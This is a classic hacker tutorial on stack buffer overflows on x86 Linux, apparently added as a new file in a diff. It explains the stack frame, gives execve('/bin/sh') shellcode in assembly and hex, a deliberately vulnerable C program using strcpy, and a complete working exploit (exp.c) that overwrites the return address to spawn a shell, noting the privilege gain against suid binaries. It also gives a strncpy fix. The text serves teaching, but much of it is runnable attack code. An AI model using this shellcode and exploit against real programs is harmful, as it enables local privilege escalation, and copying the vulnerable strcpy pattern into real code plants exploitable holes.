@@ -1,0 +1,387 @@
+
+               Buffer Overruns, whats the real story?
+               By Lefty  lefty@sliderule.geek.org.uk
+
+Please note that the examples in this file are linux specific, however
+the principle applies to many os's, however the actual stack frame may
+vary (and does) on different platforms, as well as the machine code
+(obviously :)
+
+In its simplest terms, a buffer overrun is writing to more memory than
+was reserved..  Since this happens on the stack, an understanding of
+how the stack works is essiential to altering how a program works,
+during runtime (normally code isnt executed off the stack, and some
+OS's prevent it, as you can only execute from the code section and not
+the data section..  However most unices (all I know of) allow it)..
+
+The stack is something that almost every machine uses.  Macs, PC's, unix
+boxes of various flavors, etc.  It is typically done almost the same way.
+That is, starting at high memory and working its way down to low memory.
+Since every operating system can deal with the stack differently I
+will only go into how linux (on X86) does it (this file should however make it
+fairly obvious how to figure out the stack on other platforms as well,
+providing that there isnt a whole lot of indirection (such as on a prime)
+but enough of this)..
+
+Why use a stack?  Well the stack allows for memory storage when you dont
+have enough registers.  Since it would be impossible to know exactly how
+many registers every program that is to run on a general purpose computer
+will need, there has to be limits for the registers.  Also, could you imagine
+doing a string via registers?!! :)
+
+The stack starts at a high memory address and works its way down to
+a low memory address.  Things are PUSHed onto the stack or POPed off
+the stack.  When something is PUSHed onto the stack, the value that
+is being PUSHed is copied into the memory location pointed to by
+the stack pointer, and the stack pointer is decremented to reflect
+the next spot on the stack.  When something is POPed off, the reverse
+happens.
+
+With the stack set up this way, you can call a lot of routines and always
+return with minimal effort (on the cpu/program)..
+
+When a function is called, certain things change the stack..  Local args
+are PUSHed onto the stack, then the return address (code segment), then
+the old base pointer (so its known where on the stack you were before
+this function was called), then local variables to that function..
+
+Now, all we have to do is find out where a program will let us insert data
+into it, and hopefully it wont check the length of data, so we can overwrite
+onto the stack, and send in our code (we always write better code than
+the original programmer :)
+
+Lets say that we see a routine in a program like this:
+
+hole(overflow)
+char *overflow;
+{
+  char buff[2];
+  strcpy(buff,overflow);
+}
+
+
+Well we know that strcpy(3) doesnt check the length of the data that is sent to
+it, so we can easily overwrite the stack frame, and make that program execute
+other code..  But how do we figure out where the stack frame is?  Well from
+the explanation before, buff would be on the stack right?  So we could
+modify hole() to tell us what its location is (by printing out its address),
+or better yet use a debugger to tell us where it is..  However you do it
+is really irrevalent..  If you only add code to a program you dont change
+the stack..
+
+Once we know its memory location its not far from exploiting it.  Lets assume
+that buff's address is BFFFFD48..  We could draw the stack as follows:
+
+
+Value           Addr            Description
+XX XX XX XX     BF FF FD 52     overflow
+XX XX XX XX     BF FF FD 5E     return address (from hole())
+XX XX XX XX     BF FF FD 4A     old base pointer
+XX XX XX XX     BF FF FD 48     2 bytes reserved for buff (32 bit pad)
+...                             This is where strcpy(3) and such adds
+                                to the stack frame
+
+Remember that the stack is basically backwards, so when you write to
+buff you write to higher memory locations.  strcpy(3) will also add on a null
+to the end, so we have to take that into account (to avoid a segv, but it
+shouldnt be a problem if we only use a small ammount of code).
+
+Notice that we cant access the return addr from strcpy(3) but we can
+for hole()..  That is where we will target..  Now, we know that we have to
+send in 2 bytes to fill buff, 4 bytes for the old base pointer (it has to be
+accessable to us, or it will segv) and 4 bytes to fill in the return address..
+Then our machine code (which the return addr will point to)
+
+If we enter say:
+ABCDBFFFFD52BFFFFD52xxxxxx...
+
+The stack will look like:
+xx xx xx xx     BF FF FD 52     overflow
+52 FD FF BF     BF FF FD 5E     return address
+52 FD FF BF     BF FF FD 4A     old base pointer
+CD AB XX XX     BF FF FD 48     contents of buff (padded to 32bit)
+...                             This is where strcpy(3) and such adds
+                                to the stack frame
+
+
+When hole() returns, it will use the return addr that we set, and execute
+the code that we sent, provided that any args passed to hole() arent modified
+after we set them (remember that is where the machine code is)..
+
+
+I choose to put the machine code on the stack prior to the return address..
+Some people choose to put it in the buffer that is going to be overflowed..
+In this case you cant, as there is only 2 bytes and that is hardly enough
+room, however in a lot of cases the buffer is much larger..
+
+Lets say that we wanted to just execute a shell..  That is fairly simple
+and straight forward.  Here is some code that will do that..
+
+This is the execve(2) command in asm (for linux).  I have commented it so that
+you know what it is doing a little better..
+
+**********************  shell.S -cut here- *********************************
+        .global _start
+_start:
+        movl $programname, %ebx       # ebx = program to execute
+        movl $arguments, %esi         # setting up argv[0]
+        movl %ebx, (%esi)             # set argv[0]
+        movl %esi, %ecx               # ecx = char **argv
+        movl $environment, %edx       # edx = char **envp
+        movl $0x0b, %eax              # Syscall 11 is
+        int $0x80                     # execve()
+        movl $1, %eax                 # syscall 1 is exit
+        int $0x80                     # ebx holds error value
+
+        .data
+arguments:
+        .byte 0,0,0,0,0,0,0,0         # this is argv
+environment:
+        .byte 0,0,0,0                 # this is envp
+programname:
+        .asciz "/bin/sh"              # this is the program to execute
+**********************  shell.S -cut here- *********************************
+
+There is an assembler on most unix systems called as.  You can use that to
+compile this so you have something to play with..  A suitable command line
+would be:
+as -a -o shell.o shell.S > shell.asm ; ld -o shell shell.o
+
+(the machine code (in hex) is contained in shell.asm)
+
+For more information on this you may want to view the man page on execve(2).
+
+The example just given is not quite valid..  It has nulls in it, and it makes
+it harder becuase it has to have hardcoded offsets in it..  There is a better
+way, which gheap did for splitvt...
+
+I dont know who really wrote this, as what was given to me was just the
+instructions, so I cant give credit (since there is a VERY limited way
+you can do this, with the same functionality, I am using someone elses
+code)..  This code will jmp (local instrction) to just before the data,
+then the call (local instruction) will push the address that follows that
+instruction on the stack, and then go to almost the top..  This puts the
+address of the program to execute on the stack..  It is careful to avoid
+nulls as well..
+
+**********************  shell2.S -cut here- *********************************
+        .global _start
+
+_start:
+           jmp  ending                     # jmp to get the addr of the args
+                                           # jmp and call are local
+secondstart:
+           popl    %esi                    # get addr of programname
+           leal    (%esi),%ebx             # move addr in ebx
+           movl    %ebx, 0x0B(%esi)        # mov programnmae addr into args
+
+           xor     %dx, %dx                # zero out ecx
+           movl    %edx, 7(%esi)           # add the null to the end of program
+name
+           movl    %edx, 0x0F(%esi)        # zero out argv[1]
+
+           movl    $0x1234561b, %eax       # set eax to
+           xorl    $0x12345610, %eax       # 0x0000000b
+
+           leal    0x0b(%esi), %ecx        # mov argv[1] into ecx (null no args
+)
+           mov     %ecx, %edx              # mov **envp into edx  (null no envi
+ronment)
+           int     $0x80                   # execve(ebx,ecx,edx)
+                                           # ebx=filename ecx=**argv edx=**envp
+
+        # the next 3 instructions totally needed, but it forces an exit so that
+        # any other vars you overwrote etc, wont cause the program that was
+        # overflowed to blow up..
+           xor     %eax, %eax              # zero out eax
+           inc     %eax                    # set eax to 1
+           int     $0x80                   # exit(ebx)     # ebx isnt set
+ending:
+           call    secondstart             # call pushes addr of programname
+
+programname:
+           .byte '/','b','i','n','/','s','h'
+
+
+**********************  shell2.S -cut here- *********************************
+
+Now that we have a sample of the machine code, lets put it all together and
+overrun something...
+
+This program is vunerable to an overflow..  Granted its a really stupid
+example..
+
+**********************  hole.c -cut here- *********************************
+#include <string.h>
+#include <stdio.h>
+
+main(argc,argv)
+int argc;
+char **argv;
+{
+  if(argc != 2) {
+    printf("Usage: %s overflow\n",argv[0]);
+    exit(1);
+  }
+  hole(argv[1]);
+}
+
+hole(overflow)
+char *overflow;
+{
+  char buff[2];
+  strcpy(buff,overflow);
+}
+**********************  hole.c -cut here- *********************************
+
+Here is one example of an exploit for hole.c..
+
+**********************  exp.c -cut here- *********************************
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+
+#define OFFSET       4
+#define BUFFER_SIZE  2
+long get_esp(void)
+{
+   __asm__("movl %esp,%eax\n");
+}
+
+main(int argc, char **argv)
+{
+   char *buff = NULL;
+   unsigned long *addr_ptr = NULL;
+   char *ptr = NULL;
+   int i;
+   u_char execve[] =
+     "\xeb\x24"                 /* jmp     ending             */
+   /* secondstart: */
+     "\x5e"                     /* popl    %esi               */
+     "\x8d\x1e"                 /* leal    (%esi),%ebx        */
+     "\x89\x5e\x0b"             /* movl    %ebx, 0x0B(%esi)   */
+     "\x31\xd2"                 /* xor     %edx, %edx         */
+     "\x89\x56\x07"             /* movl    %edx, 7(%esi)      */
+     "\x89\x56\x0f"             /* movl    %edx, 0x0F(%esi)   */
+     "\xb8\x1b\x56\x34\x12"     /* movl    $0x1234561b, %eax  */
+     "\x35\x10\x56\x34\x12"     /* xorl    $0x12345610, %eax  */
+     "\x8d\x4e\x0b"             /* leal    0x0b(%esi), %ecx   */
+     "\x89\xca"                 /* mov     %ecx, %edx         */
+     "\xcd\x80"                 /* int     $0x80              */
+     "\x31\xc0"                 /* xor     %eax, %eax         */
+     "\x40"                     /* inc     %eax               */
+     "\xcd\x80"                 /* int     $0x80              */
+   /* ending: */
+     "\xe8\xd7\xff\xff\xff"     /* call    secondstart        */
+     "/bin/sh";                 /* programname                */
+
+
+   if((buff = malloc(BUFFER_SIZE+8+strlen(execve)))==0) {
+     printf("can't allocate memory\n");
+     exit(0);
+   }
+   ptr = buff;
+   /* fill start of buffer with nops */
+   memset(ptr, 0x90, BUFFER_SIZE);
+   ptr += BUFFER_SIZE;
+
+   /* write the return addresses */
+   addr_ptr = (long *)ptr;
+   for(i=0;i < (8/4);i++)
+      *(addr_ptr++) = get_esp() - OFFSET;
+   ptr = (char *)addr_ptr;
+   *ptr = 0;
+
+
+   /* stick asm code into the buffer */
+   memcpy(ptr,execve,strlen(execve));
+
+   execl("/home/lefty/stack/hole", "hole", buff, NULL);
+}
+**********************  exp.c -cut here- *********************************
+
+
+Now lets look at how this program works..
+
+The stack looks something like when hole is run and hole() is called:
+
+|      Previous Stack Area                 |  Higher memory addr
+|      argc, argv, envp, as well           |
+|      as other info (varies if elf/a.out) |
+|------------------------------------------|
+|      char *argv[1]                       |
+|------------------------------------------|
+|      Return Address                      |
+|------------------------------------------|
+|      Old Base Pointer                    |<- Base Pointer points here
+|------------------------------------------|
+|      2 bytes for char buff[2]            |
+|      32 bit pad (4 bytes total)          |
+|------------------------------------------|
+|                                          |<- ESP will point here
+|                                          |       which is the next
+|                                          |       available place on
+|                                          |       the stack
+|                                          |
+|                                          |
+|                                          |  Lower memory addr
+
+Now when the strcpy(3) is called, it will copy ALL of the data that argv[1]
+points to into buff..  After the first 2 bytes we are writing on a portion
+of the stack that we really shouldnt be allowed to, but for some reason we
+are allowed to..
+
+So, we fill the buffer full of garbage that is a non null (a null will cause
+strcpy(3) to stop copying data), then write the old base pointer, then the
+return address (when hole() will return to main()), and then the machine
+code that will allow us to execute a shell..  If hole is suid we get a euid
+of whatever user owns it..
+
+A patch for hole is really simple..  Instead of using strcpy(3) use strncpy(3)
+and specify a length that is less than or equal to the total length of
+the buffer it is going into..  Remember that strcpy(3) and strncpy(3) both
+copy the null at the end of the string..
+
+If you notice I had 2 things defined in exp.c..  I will tell you how
+I got them..  I'd like to go into BUFFER_SIZE first as its easier to explain..
+
+That is the size of the buffer to the point where we would start writing
+on the stack..  If there were other variables on the stack before the buffer
+that we are filling, those also have to be added to this total..  In this case
+there werent any, so its the sizeof buff..
+
+The second thing that I defined was OFFSET..  This is what is subtracted from
+the stack pointer as returned by the asm routine (return values in C are stored
+in EAX) in the exploit program..  This is computed by:
+
+When execl(3) is called, it changes the stack frame..  There is an environment
+variable that is set to the current program running..  Instead of being
+'exp' it is now '/home/lefty/stack/hole' which is 19 bytes longer..  Since
+there is 32 bit padding, its 20 bytes..  There is also 64 bytes added in
+argv[1]..  This is the execve, as well as the 2 pointers and the
+BUFFER_SIZE..  That brings our total to 84 bytes that are added (ie lower
+stack address)..  Some of this is offset however..  There are 68 bytes of
+variables (32 bit padded) in the exploit program that are lost (beucase they
+arent in hole)..  So our total now is 16 bytes..  argv[0] is changed to the
+first arg in execl(3) which as we discussed earlier was 19 bytes longer, after
+the 32 bit padding, its 20 bytes (after starting the new process argv[0] is
+changed to the 2nd arg in execl(3) however its already taken the space on the
+stack)..  Which means our total is -4 bytes..
+
+Now, since in the exploit program there isnt any more stack space taken before
+the spot where we will write our machine code, we dont have to do anymore
+math..  If however there was some stack stuff, that would have to be computed,
+and subtracted from our current value (-4)..
+
+
+You should have learned by now how to get the offsets, buffer sizes, etc to
+write your own exploits if that is what pleases you, or at least know that
+you can, after all isnt hacking supposed to be about learning, and not about
+who has the 0day scripts?  Or is it just me...
+
+One last thing..  Dont ask me for exploit code after reading this, I will not
+give it to you..  If you really really have to have exploit code, write it
+yourself, you may learn something new when you do it..
+
+
